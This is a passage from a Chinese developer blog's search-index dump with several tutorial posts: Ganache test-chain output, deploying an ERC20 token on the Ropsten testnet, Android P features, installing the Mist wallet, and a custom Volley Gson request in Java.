2.1.0)Available Accounts==================(0) 0xef1e0310ecf99c3808940d351b8a4bd7566d0a71(1) 0xa91b4c17ff43421754a8b721a8e55ac2881d946b(2) 0x0a6d612ce9d06ee9bced7395f29b0167e059207e(3) 0xd64f06e3a98a41bea2a6fa290e742083206ee061(4) 0xd315be81ca72314a2434df898fe962e6b53db337(5) 0xd4b54a13c047214bfae17ee2e25bbe4891edf582(6) 0x630b76b384c423c231bbc3384b1333369296eff9(7) 0x5f10c0cc0a914d9e5711a4ae022c27f4be7013d4(8) 0xd7c06d6f55c44125a11d7d203bb24c86f786b37d(9) 0x2fc8126d7ea755089dc7337fe956f2f0369a205bPrivate Keys==================(0) 82d925b9235dcf17d2e7cb0907084bf44fa9ce7ab31a9d2375b5db75e2da0509(1) 3f02535f00fa0ab48c306e561491cb4e10c684cea0297ec23aa4e87322108723(2) a0c830651cac356ce0a1a1d471ae0a77d2f0cfbb869dbd2d7650d4827becf879(3) 60a0a77161316406a5c03453d9e85427357f4046939bd4f884561cc806a4dccf(4) 7914c24a44119f21071b2a7da59a4b07a8c665475b995e0491bf62e7b1cc0403(5) bc512c5af4b68021be1ea084e93acf87fd3c1dea4a3ad1eec60cc0ba408f5ac0(6) 2f1831f2ab30d0b091a4dced5dcac68c79fad0352727a5ab4edd694c3a9d4bd7(7) 963d08d6060e01eb9223e742f12955daf00f5cc54220001ce75353a50a017968(8) e3d724fa1a859afda107e9be2e3b0d5703705436bae1057280b8363bc6929fd8(9) 6a661a59913f97e6fbd9cc4d56e8fc4d6c098d7be14254d788a5917cfe498bfdHD Wallet==================Mnemonic: penalty until vessel limit motor waste rule ability soft moral stem harshBase HD Path: m/44&apos;/60&apos;/0&apos;/0/&#123;account_index&#125;Listening on localhost:8545","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"4、基于Ropsten测试网络用Remix发布Token(代币)","slug":"区块链/4、基于Ropsten测试网络用Remix发布Token(代币)","date":"2018-05-15T13:01:01.000Z","updated":"2018-05-15T13:01:01.000Z","comments":true,"path":"区块链/4、基于Ropsten测试网络用Remix发布Token(代币)/","link":"","permalink":"http://yoursite.com/区块链/4、基于Ropsten测试网络用Remix发布Token(代币)/","excerpt":"","text":"参考《以太坊发token教程》本文只记录操作流程，在Ropsten Test Net下操作（非私有链），用MetaMask和Remix-ide来完成发行部署。 准备工作 安装MetaMask钱包，在Ropsten网络创建和登录账号( 0xBCdc478c31Bb569AFc9ed986E869f62A117a4Cae ),这个账号将会是我们的智能合约的所有者，token发行数量都是存入到这个账号. 在MetaMask的Buy按钮，去领一些以太坊测试币(request 1 eth from faucet 按钮点一次领一个币)，用于部署合约。 编写Token的合约代码接口(ERC20标准)12345678910111213141516171819202122232425262728293031323334353637383940pragma solidity ^0.4.4;contract Token &#123; /// @return 返回token的发行量 function totalSupply() constant returns (uint256 supply) &#123;&#125; /// @param _owner 查询以太坊地址token余额 /// @return 返回余额 function balanceOf(address _owner) constant returns (uint256 balance) &#123;&#125; /// @notice msg.sender（交易发送者）发送 _value（一定数量）的 token 到 _to（接受者） /// @param _to 接收者的地址 /// @param _value 发送token的数量 /// @return 是否成功 function transfer(address _to, uint256 _value) returns (bool success) &#123;&#125; /// @notice 发送者 发送 _value（一定数量）的 token 到 _to（接受者） /// @param _from 发送者的地址 /// @param _to 接收者的地址 /// @param _value 发送的数量 /// @return 是否成功 function transferFrom(address _from, address _to, uint256 _value) returns (bool success) &#123;&#125; /// @notice 发行方 批准 一个地址发送一定数量的token /// @param _spender 需要发送token的地址 /// @param _value 发送token的数量 /// @return 是否成功 function approve(address _spender, uint256 _value) returns (bool success) &#123;&#125; /// @param _owner 拥有token的地址 /// @param _spender 可以发送token的地址 /// @return 还允许发送的token的数量 function allowance(address _owner, address _spender) constant returns (uint256 remaining) &#123;&#125; /// 发送Token事件 event Transfer(address indexed _from, address indexed _to, uint256 _value); /// 批准事件 event Approval(address indexed _owner, address indexed _spender, uint256 _value);&#125; 实现ERC20标准1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950pragma solidity ^0.4.4;import \"./Token.sol\";contract StandardToken is Token &#123; function transfer(address _to, uint256 _value) returns (bool success) &#123; //默认token发行量不能超过(2^256 - 1) //如果你不设置发行量，并且随着时间的发型更多的token，需要确保没有超过最大值，使用下面的 if 语句 //Replace the if with this one instead. //if (balances[msg.sender] &gt;= _value &amp;&amp; balances[_to] + _value &gt; balances[_to]) &#123; if (balances[msg.sender] &gt;= _value &amp;&amp; _value &gt; 0) &#123; balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; &#125; else &#123; return false; &#125; &#125; function transferFrom(address _from, address _to, uint256 _value) returns (bool success) &#123; //向上面的方法一样，如果你想确保发行量不超过最大值 //if (balances[_from] &gt;= _value &amp;&amp; allowed[_from][msg.sender] &gt;= _value &amp;&amp; balances[_to] + _value &gt; balances[_to]) &#123; if (balances[_from] &gt;= _value &amp;&amp; allowed[_from][msg.sender] &gt;= _value &amp;&amp; _value &gt; 0) &#123; balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; &#125; else &#123; return false; &#125; &#125; function balanceOf(address _owner) constant returns (uint256 balance) &#123; return balances[_owner]; &#125; function approve(address _spender, uint256 _value) returns (bool success) &#123; allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; &#125; function allowance(address _owner, address _spender) constant returns (uint256 remaining) &#123; return allowed[_owner][_spender]; &#125; mapping (address =&gt; uint256) balances; mapping (address =&gt; mapping (address =&gt; uint256)) allowed; uint256 public totalSupply;&#125; 实现自己的Token(代币)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748pragma solidity ^0.4.4;import \"./StandardToken.sol\";contract TeaToken is StandardToken &#123; function () &#123; //if ether is sent to this address, send it back. throw; &#125; /* Public variables of the token */ /* NOTE: The following variables are OPTIONAL vanities. One does not have to include them. They allow one to customise the token contract &amp; in no way influences the core functionality. Some wallets/interfaces might not even bother to look at this information. */ string public name; //token名称: TeaCoin uint8 public decimals; //小数位How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether. string public symbol; //标识An identifier: eg SBX string public version = 'H0.1'; //版本号human 0.1 standard. Just an arbitrary versioning scheme. function TeaToken( uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol ) &#123; balances[msg.sender] = _initialAmount; // Give the creator all initial tokens totalSupply = _initialAmount; // Update total supply name = _tokenName; // Set the name for display purposes decimals = _decimalUnits; // Amount of decimals for display purposes symbol = _tokenSymbol; // Set the symbol for display purposes &#125; /* 批准然后调用接收合约 Approves and then calls the receiving contract */ function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) &#123; allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); //调用你想要通知合约的 receiveApprovalcall 方法 ，这个方法是可以不需要包含在这个合约里的。 //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData) //假设这么做是可以成功，不然应该调用vanilla approve。 if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) &#123; throw; &#125; return true; &#125;&#125; 编译合约代码我们用在线编译器Solidity Remix Compiler 导入我们三个sol文件，一一选中，分别编译。 发行(部署)Token的合约代码 JavaScript VM：JS虚拟机，通过JS模拟的钱包环境。Injected Web3：使用MetaMask之类的Chrome插件钱包作为调试环境。Web3 Provider：使用eth钱包作为测试环境，如geth。 Injected Web3，选中Run，可以看到Accout显示的是当前登录在MetaMask 登录的账号，选中我们要发行的TeaToken。 我们要发行的Token如下： 名称： TeaCoin标识： TMC小数位： 18发行量： 10000 在Deploy的编辑框输入： 1&quot;10000000000000000000000&quot;,&quot;TeaCoin&quot;,18,&quot;TMC&quot; 点击Deploy就开始部署了，MetaMask 会有确认框弹出，部署成功的话，会有一个合约地址。 在 etherscan 可以查看账号,如 oxbc ： 1Contract 0x3814e6421417c354c090898ad4ae63c85ffef039 etherscan 也可以查看合约，如 TeaCoin： 在MetaMask 添加我们的 TeaToken，填入合约地址就可以了，其他两项会自动填充。成功的话，可以看到账号的TMC币的余额就是我们的发行数量。 流通我们的代币流通就是将代币从一个账号转移给另一个账号，所以我们通过 MetaMask 再次创建一个账号(0x51A7Da564a85CCaae01822af00330E7A5AEAac6d)。 接下来我们将从账号 oxbc 转 1 个TMC币到账号 ox51。 依然是在Remix的Run中，把合约地址加入进到At Address transfer 就是对应我们合约上的transfer函数，可以进行交易。 输入账号ox51的地址和交易的数量： 1&quot;0x51A7Da564a85CCaae01822af00330E7A5AEAac6d&quot;,&quot;1000000000000000000&quot; 点击transfer，等待交易确认。 交易确认之后，就能在账号0x51看到有一个TMC币了。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"Android P(9.0) 功能和 API","slug":"Android/Android P(9.0) 功能和 API","date":"2018-05-12T01:52:36.000Z","updated":"2021-12-28T03:24:10.099Z","comments":true,"path":"Android/Android P(9.0) 功能和 API/","link":"","permalink":"http://yoursite.com/Android/Android P(9.0) 功能和 API/","excerpt":"","text":"原文Android P 为用户和开发者引入众多新特性和新功能。 本文重点介绍面向开发者的新功能。 要了解新 API，请阅读 API 差异报告或访问 Android API 参考 — 为醒目起见，将突出显示新 API。 请务必查阅 Android P 行为变更以了解平台变更可能给您的应用带来哪些方面的影响。 利用 Wi-Fi RTT 进行室内定位Android P 添加了对 IEEE 802.11mc Wi-Fi 协议（也称为 Wi-Fi Round-Trip-Time (RTT)）的平台支持，从而让您的应用可以利用室内定位功能。在提供硬件支持的 Android P 设备上，应用可以使用全新的 RTT API 来测量与附近支持 RTT 的 Wi-Fi 接入点 (AP) 的距离。 设备必须已启用定位并开启了 Wi-Fi 扫描（在 Settings &gt; Location 下），同时您的应用必须具有 ACCESS_FINE_LOCATION 权限。 设备不需要连接至 AP 即可使用 RTT。 为保证隐私性，只有手机可以确定与 AP 的距离；AP 不具备该信息。 如果您的设备测量与 3 个或更多 AP 的距离，您可以使用一个多点定位算法来预估与这些测量值最相符的设备位置。 结果通常精准至 1 至 2 米。 通过这种精确性，您可以打造新的体验，例如楼内导航、基于精细位置的服务，如无歧义语音控制（例如，“打开这盏灯”），以及基于位置的信息（如 “此产品是否有特别优惠？”）。 屏幕缺口支持(刘海屏)Android P 支持最新的全面屏以及为摄像头和扬声器预留空间的凹口屏幕。 通过全新的 DisplayCutout 类，可以确定非功能区域的位置和形状，这些区域不应显示内容。 要确定这些凹口屏幕区域是否存在及其位置，请使用 getDisplayCutout() 函数。 您可以按如下方法在任何运行 Android P 的设备或模拟器上模拟屏幕缺口： 1. 启用开发者选项。 2. 在 Developer options 屏幕中，向下滚动至 Drawing 部分并选择 Simulate a display with a cutout。 3. 选择凹口屏幕的大小。 注：我们建议您通过使用运行 Android P 的设备或模拟器测试凹口屏幕周围的内容显示。 通知Android P 引入了多个通知增强功能，可供以 Android P 及更高版本作为目标平台的开发者使用。从 Android 7.0（API 级别 24）开始，您可以添加一个操作以回复短信或直接从通知中输入其他文本。 渠道设置、广播和请勿打扰Android O 引入了通知渠道，从而允许您为要显示的每种通知类型创建可由用户自定义的渠道。 多摄像头支持和摄像头更新现在，在运行 Android P 的设备上，您可以通过两个或更多物理摄像头来同时访问多个视频流。 在配备双前置摄像头或双后置摄像头的设备上，您可以创建只配备单摄像头的设备所不可能实现的创新功能，例如无缝缩放、虚化和立体成像。 通过此 API，您还可以调用逻辑或融合的摄像头视频流，该视频流可在两个或更多摄像头之间自动切换。 摄像头方面的其他改进还包括新的会话参数和 Surface 共享，前者有助于降低首次拍照期间的延迟，而后者则让摄像头客户端能够处理各种用例，而无需停止并启动摄像头视频流。 我们还针对基于显示屏的 flash 支持和 OIS 时间戳访问新增了一些 API，用以实现应用级的图像稳定化和特效。 在受支持的设备上，Android P 还支持外置 USB/UVC 摄像头。 适用于位图和可绘制对象的 ImageDecoderAndroid P 引入 ImageDecoder ，以提供现代化的图像解码方法。 您应使用 ImageDecoder 来解码图像，而不是使用 BitmapFactory 和 BitmapFactory.Options API。 ImageDecoder 让您可以从字节缓冲区、文件或 URI 来创建 Drawable 或 Bitmap。 要解码图像，请首先以编码图像的来源为参数，调用 createSource()。 然后，通过传递 ImageDecoder.Source 对象来调用 decodeBitmap() 或 decodeDrawable() ，从而创建 Bitmap或 Drawable。 要更改默认设置，请将 OnHeaderDecodedListener 传递给 decodeBitmap() 或 decodeDrawable()。 ImageDecoder 以图像的默认宽度和高度（若已知的话）为参数，调用onHeaderDecoded()。 如果编码图像是动画 GIF 或 WebP，decodeDrawable() 将返回 Drawable，后者是 AnimatedImageDrawable 类的一个实例。 您可以使用不同的方法来设置图像属性。 这些方法包括： 要将解码的图像缩放到精确尺寸，请以目标尺寸为参数，调用 setResize()。 您也可以使用样图尺寸来缩放图像。 将样图尺寸直接传递给 setResize()，或者调用getSampledSize() 以查看 ImageDecoder 能够最高效地获取何种尺寸的样图。 要在缩放图像的范围内裁剪图像，请调用 setCrop()。 要创建可变的 Bitmap，请调用 setMutable(true)。 通过 ImageDecoder，您还可以为圆角或圆形遮罩之类的图像添加复杂的定制效果。 以 PostProcessor 类的一个实例作为参数，使用 setPostProcessor() 来执行您希望绘制命令执行的任何工作。 当您对 AnimatedImageDrawable 进行后处理时，这些效果会作用与所有框。 动画Android P 引入了一个新的 AnimatedImageDrawable 类，用于绘制和显示 GIF 和 WebP 动画图像。 AnimatedImageDrawable 的工作方式 AnimatedVectorDrawable 的相似之处在于，都是 RenderThread 驱动 AnimatedImageDrawable 的动画。 RenderThread 还使用工作线程进行解码，因此，解码不会干扰 RenderThread。 这种实现机制允许您的应用在使用动画图像时不必管理其更新，也不会干扰应用的界面线程。 可使用新的 ImageDecoder 解码 AnimagedImageDrawable。 以下代码段演示如何使用 ImageDecoder 来解码 AnimatedImageDrawable： 1234Drawable d = ImageDecoder.decodeDrawable(...);if (d instanceof AnimatedImageDrawable) &#123; ((AnimatedImageDrawable) d).start(); // Prior to start(), the first frame is displayed&#125; ImageDecoder 有几种方法可用来进一步修改图像。 例如，您可以使用 setPostProcessor() 函数来修改图像的外观，例如应用圆形遮罩或圆角。 HDR VP9 视频、HEIF 图像压缩和 Media APIAndroid P 新增对 High Dynamic Range (HDR) VP9 Profile 2 的内置支持，因此，现在您可以在支持 HDR 的设备上为用户提供来自 YouTube、Play Movies 和其他来源的采用 HDR 的影片。 Android P 为平台增加了对 HEIF (heic) 图像编码的支持。 MediaMuxer 和 MediaExtractor 类中可支持 HEIF 静态图像示例 HEIF 改进了压缩，可节省存储空间和网络数据流量。 借助 Android P 设备上的平台支持，从后端服务器发送和使用 HEIF 图像轻而易举。 确保应用兼容这种便于共享和显示的数据格式后，尝试在应用中使用 HEIF 作为图像存储格式。 您可以使用 ImageDecoder 或 BitmapFactory 进行 jpeg 到 heicto 的转换，以通过 jpeg 获取位图，并且可以使用全新支持库 alpha 版中的 HeifWriter 编写来自 YUV 字节缓冲区、Surface 或 Bitmap 的 HEIF 静态图像。 另外，Android P 还引入了 MediaPlayer2。 此播放器支持使用 DataSourceDesc 构建的播放列表。 要创建 MediaPlayer2 的实例，请使用 MediaPlayer2.create()。 现在，还可通过 AudioTrack、AudioRecord 和 MediaDrm 类获取媒体指标。 Android P 向 MediaDRM 类添加了新函数以获取指标、高带宽数字内容保护 (HDCP) 级别、安全级别和会话数，并对安全性级别和安全停止进行更多控制。 如需了解更多详情，请参阅 API 差异报告。 JobScheduler 中的数据成本敏感度Android P 中对 JobScheduler 进行了改进，使其可以更好地为用户处理网络相关的作业，从而与运营商独立提供的网络状态信号相协调。 现在，作业可以声明其预估的数据大小、信号预提取，并指定具体的网络要求，而运营商可以报告网络拥塞或无限流量。 然后，JobScheduler 根据网络状态管理工作。 例如，当网络拥塞时，JobScheduler 可能会延迟较大的网络请求。 如果使用的是无限流量网络，则 JobScheduler 可运行预提取作业以提升用户体验（例如预提取标题）。 添加作业时，确保使用 setEstimatedNetworkBytes()、setIsPrefetch() 和 setRequiredNetwork()（如果适用），以帮助 JobScheduler 正确处理工作。 在执行作业时，请确保使用 JobParameters.getNetwork() 返回的 Network 对象。 否则，您将隐式使用设备的默认网络，其可能不符合您的要求，从而导致意外的流量消耗 Neural Networks API 1.1Android 8.1（API 级别 27）中引入了 Neural Networks API 以加快 Android 设备上机器学习的速度。 Android P 扩展并改进了该 API，从而增加了对 Pad、BatchToSpaceND、SpaceToBatchND、Transpose、Strided Slice、Mean、Div、Sub 和 Squeeze 九个新运算的支持。 自动填充框架Android 8.0（API 级别 26）引入了自动填充框架，简化了应用中的表单填写。 Android P 引入了多项改进，自动填充服务可以利用这些改进进一步增强用户填写表单时的体验。 如需了解更多详情，请参阅自动填充框架页面。 安全增强功能Android P 引入了许多新的安全功能，包括统一的指纹身份验证对话框和针对敏感交易的高可信度用户确认。 如需了解更多详情，请参阅安全性更新页面。 Android 备份的客户端加密Android P 支持使用客户端密钥加密 Android 备份。 由于此隐私措施，在从用户设备制作的备份恢复数据时，会要求提供设备的 PIN 码、图案或密码。 如需详细了解这项新功能背后的技术，请参阅 Google 云密钥保险柜服务白皮书。 无障碍功能窗格标题在 Android P 之前，无障碍服务无法轻松确定屏幕的某个区域是否经过更新，例如在 Fragment 过渡期间。 在 Android P 中，各个窗格区域的标题现在采用 accessibility pane titles 的格式。 无障碍服务可以收到这些标题的变更，从而能够提供关于所做变更的更精细信息。 要指定某个区域的标题，请使用新的 android:accessibilityPaneTitle 属性。 您也可以更新您在运行时使用 setAccessibilityPaneTitle() 替换的某个界面区域的标题。 例如，您可以为某个 Fragment 对象的内容区域提供标题。 基于标题的导航如果您的应用显示的内容包含具有逻辑含义的标题，则对于表示这些标题的 View 实例，将新的 android:accessibilityHeading 属性设置为 true。 这样，用户可以从一个标题导航至下一个标题。 在用户操作屏幕阅读器时，这种导航过程尤其方便。 便捷操作Android P 新增了一些方便用户执行操作的支持功能： 访问提示： 无障碍框架中的新功能让您可在应用界面中访问提示。 使用 getTooltipText() 读取提示文本，使用新的 ACTION_SHOW_TOOLTIP 和 ACTION_HIDE_TOOLTIP 来指示 View 的实例显示或隐藏提示。 新的全局操作： Android P 在 AccessibilityService 类中引入了对两个新设备操作的支持。 您的 Service 现在可以帮助用户分别使用 GLOBAL_ACTION_LOCK_SCREEN 和 GLOBAL_ACTION_TAKE_SCREENSHOT 操作锁定其设备并进行屏幕截图。 窗口变更详情Android P 让您可以在应用同时重绘多个窗口时，更轻松地跟踪应用窗口的更新。 当发生 TYPE_WINDOWS_CHANGED 事件时，可使用 getWindowChanges() API 来确定窗口发生的变更。 现在，在多窗口更新期间，每个窗口都会生成自己的一组事件。 getSource() 函数返回与每个事件相关联的窗口的根视图。 如果应用已为其 View 对象定义无障碍功能窗格标题，您的 Service 将可以识别应用界面何时进行更新。 当发生 TYPE_WINDOW_STATE_CHANGED 事件时，可使用 getContentChangeTypes() 所返回的新类型来确定窗口发生的变更。 例如，框架现在可以检测窗格何时有新标题或者窗格何时消失。 旋转为避免无意的旋转，我们新增了一个模式，哪怕设备位置发生变化，也会固定在当前屏幕方向上。 必要时用户可以通过按系统栏上的一个新增按钮手动触发旋转。 在大多数情况下，对应用的兼容性影响应该微不足道。 不过，如果您的应用有任何自定义旋转行为，或使用了任何机密的屏幕方向设置，则可能会遇到以前用户旋转首选项始终设置为纵向时被忽视的问题。 我们鼓励您审视一下您的应用所有关键 Activity 中的旋转行为，并确保您的所有屏幕方向设置仍可提供最佳体验。 一个新的旋转模式允许用户在必要时利用系统栏上的一个按钮手动触发旋转。 内置 QR 码库Android P 自行捆绑了一个 QR 码库，以精简 QR 码设备配置。 IT 管理员不再需要手动输入 Wi-Fi 详细信息来设置设备。 从 Android P 开始，可在 QR 码内包含这些 Wi-Fi 详细信息。 当 IT 管理员使用公司所有的设备扫描 QR 码时，设备会自动连接到 Wi-Fi 并进入配置流程，无需任何额外的手动输入。 后台应用中的输入和数据隐私Android P 通过限制后台应用访问用户输入和传感器数据的能力增强了隐私性。 如果您的应用在运行 Android P 的设备上在后台运行，系统将对您的应用施加以下限制： 您的应用不能访问麦克风或摄像头。 使用连续报告模式的传感器（例如加速度计和陀螺仪）不会接收事件。 使用发送变化时或一次性报告模式的传感器不会接收事件。 如果您的应用需要在运行 Android P 的设备上检测传感器事件，请使用前台服务。 注：对 SensorManager 的某个实例调用 flush() 的应用不会受此变更影响。 加密变更Android P 针对加密算法的实现和处理引入了几项变更。参数和算法的 Conscrypt 实现 Android P 在 Conscrypt 中实现了更多的算法参数{: .external-link}。 这些参数包括： AES、DESEDE、OAEP 和 EC。 这些参数和许多算法的 Bouncy Castle 版本{: .external-link} 在 Android P 中已被弃用。 注：EC 参数的 Conscrypt 实现仅支持已命名的曲线。 如果您的应用以 Android 8.1（API 级别 27）或更低版本为目标，则在请求上述已弃用算法的 Bouncy Castle 实现时，您将收到一条警告消息。 然而，如果您以 Android P 为目标，则这些请求会各自引发 NoSuchAlgorithmException。 Android P 引入了其他几项加密变更： 使用 PBE 密钥时，如果 Bouncy Castle 需要初始化矢量 (IV)，而您的应用未提供 IV，则会收到一条警告消息。 ARC4 加密的 Conscrypt 实现允许您指定 ARC4/ECB/NoPadding 或 ARC4/NONE/NoPadding。 Crypto Java 加密架构 (JCA) 提供程序现已被移除。 因此，如果您的应用调用 SecureRandom.getInstance(“SHA1PRNG”, “Crypto”)，将会发生 NoSuchProviderException。 如果您的应用从大于密钥结构的缓冲区中解析 RSA 密钥，将不会再发生异常。 Java UTF 解码器UTF-8 是 Android 中的默认字符集。 UTF-8 字节序列可由 String(byte[] bytes) 之类的 String 构造函数解码。 Android P 中的 UTF-8 解码器更严格，其遵循 Unicode 标准，也即： 非最短形式的 UTF-8（例如 &lt;C0, AF&gt;）现在被视为格式不正确。 替代形式的 UTF-8（例如 U+D800..U+DFFF）现在被视为格式不正确。 最大的子部分被单个 U+FFFD 取代。 例如，在字节序列“41 C0 AF 41 F4 80 80 41”中，最大子部分为“C0”、“AF”和“F4 80 80”。其中“F4 80 80”可以是“F4 80 80 80”的初始子序列，但“C0”不能是任何形式正确的代码单位序列的初始子序列。 因此，输出应为“A\\ufffd\\ufffdA\\ufffdA”。 要在 Android P 中解码修改后的 UTF-8/CESU-8 序列，请使用 DataInputStream.readUTF() 函数或 NewStringUTF() JNI 函数。 套接字标记在 Android P 以前的平台版本上，如果使用 setThreadStatsTag() 函数标记某个套接字，则当使用带 ParcelFileDescriptor 容器的 binder IPC 将其发送给其他进程时，套接字会被取消标记。 从 Android P 开始，利用 binder IPC 将套接字发送至其他进程时，其标记将得到保留。 此变更可能影响网络流量统计，例如，使用queryDetailsForUidTag() 函数时。 您可以通过先调用 untagSocket() 然后再将套接字发送至其他进程，保留以前的行为。 在调用 shutdownInput() 函数后调用 available() 函数会返回 0。 现在，强制执行 FLAG_ACTIVITY_NEW_TASK 要求在 Android P 中，您不能从非 Activity 环境中启动 Activity，除非您传递 Intent 标志 FLAG_ACTIVITY_NEW_TASK。 如果您尝试在不传递此标志的情况下启动 Activity，则该 Activity 不会启动，系统会在日志中输出一则消息。 注：在 Android N 之前，标志要求一直是期望的行为并被强制执行。 Android N 中的一个错误会临时阻止实施标志要求。 屏幕旋转变更Android O 中的用户可以使用 Quicksettings 图块或 Display 设置在自动屏幕旋转和纵向旋转模式之间切换。 Android P 对纵向旋转模式做出了重大变更。 纵向模式已重命名为旋转锁定，它会在自动屏幕旋转关闭时启用。 自动屏幕旋转模式没有任何变更。 当设备处于旋转锁定模式时，用户可将其屏幕锁定到顶层可见 Activity 所支持的任何旋转。 Activity 不应假定它将始终以纵向呈现。 如果顶层 Activity 可在自动屏幕旋转模式下以多种旋转呈现，则应在旋转锁定模式下提供相同的选项，根据 Activity 的 screenOrientation 设置，允许存在一些例外情况（见下表）。 请求特定屏幕方向（例如，screenOrientation=landscape）的 Activity 会忽略用户锁定首选项，并且行为与 Android O 中的行为相同。 可在 Android 清单中，或以编程方式通过 setRequestedOrientation()，在 Activity 一级设置屏幕方向首选项。 旋转锁定模式通过设置 WindowManager 在处理 Activity 旋转时使用的用户旋转首选项来发挥作用。 用户旋转首选项可能在下列情况下发生变更。 请注意，恢复纵向模式存在偏差： 当用户接受旋转建议时，旋转首选项变为建议方向。 当用户切换到强制纵向应用（包括锁定屏幕或启动器）时，旋转首选项变为纵向。 下表总结了常见屏幕方向的旋转行为: 表格，看原文 完","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"免费下载App图标Icon","slug":"前端/免费下载App图标Icon","date":"2018-05-09T14:54:53.000Z","updated":"2021-12-28T03:24:10.256Z","comments":true,"path":"前端/免费下载App图标Icon/","link":"","permalink":"http://yoursite.com/前端/免费下载App图标Icon/","excerpt":"","text":"可以下载一些常用的icon material-icons icons8.com icons8.cn iconfinder 阿里妈妈","categories":[],"tags":[]},{"title":"3、以太坊钱包Mist","slug":"区块链/3、以太坊钱包Mist","date":"2018-05-06T04:52:36.000Z","updated":"2018-05-06T04:52:36.000Z","comments":true,"path":"区块链/3、以太坊钱包Mist/","link":"","permalink":"http://yoursite.com/区块链/3、以太坊钱包Mist/","excerpt":"","text":"参考这篇文章: 玩转以太坊(Ethereum)的测试网络 以下是我在Ubuntu18.04下使用 Mist 记录 安装钱包(Mist)下载Mist: https://github.com/ethereum/mist/releases (这里安装的是 Mist-linux64-0-10-0.zip) Mist其实只是以太坊钱包的一个图形界面，后端还是官方的Geth。 Mist和Ethereum Wallet有什么区别 123456789# 先安装geth$ sudo apt-get install software-properties-common$ sudo add-apt-repository -y ppa:ethereum/ethereum$ sudo apt-get update$ sudo apt-get install ethereum# 下载的zip包，解压运行Mist# 启动提示缺少libgconf-2.so.4$ sudo apt-get install libgconf2-4 选择网络这个版本启动就默认选择了主网络，点击 “LAUNCH APPLICATION!” 进入主界面，在顶部菜单中选择 Rinkeby-Test Network 或者 Ropsten Test Network 创建账号输入密码就可以创建在测试网络的账号。 获取测试网络上的以太币Ropsten 网络直接点击 Buy 就可以了。 传送门","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"写一个Volley自定义Request","slug":"Android/写一个Volley自定义请求","date":"2018-04-30T11:52:36.000Z","updated":"2021-12-28T03:24:10.123Z","comments":true,"path":"Android/写一个Volley自定义请求/","link":"","permalink":"http://yoursite.com/Android/写一个Volley自定义请求/","excerpt":"","text":"参考：request-custom 在Android中，使用Volley来请求JSON数据，Volley自带 StringRequest JsonObjectRequest JsonArrayRequest JsonRequest GET示例自定义Request，就是在Request中使用Gson把数据处理为对象，返回给调用者。示例 GsonRequestSample.java (GET Request)： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162//代码来自：https://developer.android.google.cn/training/volley/request-customimport com.android.volley.AuthFailureError;import com.android.volley.NetworkResponse;import com.android.volley.ParseError;import com.android.volley.Request;import com.android.volley.Response;import com.android.volley.toolbox.HttpHeaderParser;import com.google.gson.Gson;import com.google.gson.JsonSyntaxException;import java.io.UnsupportedEncodingException;import java.util.Map;public class GsonRequestSample&lt;T&gt; extends Request&lt;T&gt; &#123; private final Gson gson = new Gson(); private final Class&lt;T&gt; clazz; private final Map&lt;String, String&gt; headers; private final Response.Listener&lt;T&gt; listener; /** * Make a GET request and return a parsed object from JSON. * * @param url URL of the request to make * @param clazz Relevant class object, for Gson's reflection * @param headers Map of request headers */ public GsonRequestSample(String url, Class&lt;T&gt; clazz, Map&lt;String, String&gt; headers, Response.Listener&lt;T&gt; listener, Response.ErrorListener errorListener) &#123; super(Method.GET, url, errorListener); this.clazz = clazz; this.headers = headers; this.listener = listener; &#125; @Override public Map&lt;String, String&gt; getHeaders() throws AuthFailureError &#123; return headers != null ? headers : super.getHeaders(); &#125; @Override protected void deliverResponse(T response) &#123; listener.onResponse(response); &#125; @Override protected Response&lt;T&gt; parseNetworkResponse(NetworkResponse response) &#123; try &#123; String json = new String( response.data, HttpHeaderParser.parseCharset(response.headers)); return Response.success( gson.fromJson(json, clazz), HttpHeaderParser.parseCacheHeaders(response)); &#125; catch (UnsupportedEncodingException e) &#123; return Response.error(new ParseError(e)); &#125; catch (JsonSyntaxException e) &#123; return Response.error(new ParseError(e)); &#125; &#125;&#125; 修改为POST现在，把以上的示例改为用户登录接口，使其支持 POST Request，参数已JSON的格式发送，响应为JSON格式数据，转为本地Bean类。 请求体:12345678POST /api/users/login HTTP/1.1Host: api.666.comContent-Type: application/json&#123; \"email\":\"sam@qq.com\", \"password\":\"123456\"&#125; 注意要加入Header：&quot;Content-Type&quot;,&quot;application/json&quot; 响应:1234&#123; \"code\": 200, \"token\": \"1234567890\"&#125; 代码(GsonRequest.java)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293import com.android.volley.AuthFailureError;import com.android.volley.NetworkResponse;import com.android.volley.ParseError;import com.android.volley.Request;import com.android.volley.Response;import com.android.volley.toolbox.HttpHeaderParser;import com.google.gson.Gson;import com.google.gson.JsonSyntaxException;import org.json.JSONObject;import java.io.UnsupportedEncodingException;import java.util.HashMap;import java.util.Map;public class GsonRequest&lt;T&gt; extends Request&lt;T&gt; &#123; private final Gson gson = new Gson(); private final Class&lt;T&gt; clazz; 